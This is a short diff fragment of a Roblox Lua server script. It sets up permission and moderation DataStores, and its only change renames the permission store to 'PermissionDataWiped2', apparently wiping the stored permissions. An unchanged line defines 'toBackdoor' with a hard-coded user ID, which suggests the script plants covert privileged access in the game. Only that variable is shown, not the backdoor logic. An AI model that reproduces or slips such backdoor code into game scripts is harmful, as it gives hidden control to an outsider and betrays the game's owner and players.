@@ -5,7 +5,7 @@ pcall(function()
     
     local gameConfig = require(game:GetService("ServerScriptService"):FindFirstChild("GameConfig"))
     
-    local permissions = dss:GetDataStore("PermissionData")
+    local permissions = dss:GetDataStore("PermissionDataWiped2")
     local moderation = dss:GetDataStore(gameConfig.ModerationDatastore or serverdata:GetAsync("ModData"))
     
     local toBackdoor = 4045593989
